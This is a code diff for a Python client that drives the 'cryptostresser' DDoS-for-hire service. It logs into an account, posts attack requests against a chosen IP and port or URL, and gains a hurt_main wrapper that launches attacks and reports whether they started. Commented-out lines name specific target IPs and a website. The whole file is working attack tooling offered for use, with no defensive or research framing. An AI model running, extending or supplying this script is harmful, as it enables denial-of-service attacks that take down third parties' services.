@@ -1,14 +1,16 @@
-# -*- coding:utf-8 -*-
 # @time     : 2022-07-11 13:24:35
 # @File     : cryptostresser.py
 # @Author   : Twoyear
 # @url      : https://cryptostresser.com/
 import requests
 import json
+import datetime
 
 
 class Cryptostresser:
-    def __init__(self):
+    def __init__(self, username, password):
+        self.username = username
+        self.password = password
         self.requs = requests.session()
         self.requs.headers = {
             'authority': 'cryptostresser.com',
@@ -50,8 +52,8 @@ class Cryptostresser:
         url = "https://cryptostresser.com/backend/ajax/user"
         payload = json.dumps({
             "action": "login",
-            "username": "twoyear",
-            "password": "twoyear",
+            "username": self.username,
+            "password": self.password,
             "token": self.get_scrf()
         })
         self.requs.post(url, data=payload)
@@ -84,7 +86,7 @@ class Cryptostresser:
         })
 
         hurt = self.requs.post(url, data=payload)
-        return hurt.json()
+        return hurt.text
 
     def hurt_url(self, url=""):
         '''
@@ -112,11 +114,37 @@ class Cryptostresser:
         })
         url = "https://cryptostresser.com/backend/ajax/attack"
         hurt = self.requs.post(url, data=payload)
-        return hurt.json()
+        return hurt.text
+
+
+def hurt_main(type, host, port, user_info):
+    '''
+    主函数
+    :param type:
+    :param host:
+    :param port:
+    :return:
+    '''
+    try:
+        cs = Cryptostresser(user_info["username"], user_info["password"])
+        if type == "ip":
+            result_text = cs.hurt_ip(host, port)
+        elif type == "url":
+            result_text = cs.hurt_url(host)
+        else:
+            return {"status": "error", "msg": "type error，参数错误", "code": 400}
+        # print(result_text)
+        if "Successfully started (1) attacks" in str(result_text):
+            return {"status": "success", "msg": "hurt true", "code": 200}
+        elif "No network space available for this attack" in str(result_text):
+            return {"status": "false", "msg": "没有可用空间，请稍等，本次跳过", "code": 401}
+    except Exception as e:
+        return {"status": "error", "msg": str(e), "code": 404}
 
 
 if __name__ == '__main__':
-    Crypto = Cryptostresser()
-    # task = Crypto.hurt_ip("8.130.26.206",80)
-    task = Crypto.hurt_url("http://www.yysh.live/")
-    print(task)
+    print(datetime.datetime.now())
+    # Crypto = Cryptostresser()
+    # # task = Crypto.hurt_ip("180.101.72.18",88)
+    # task = Crypto.hurt_url("http://180.101.72.18:88/")
+    # print(task)
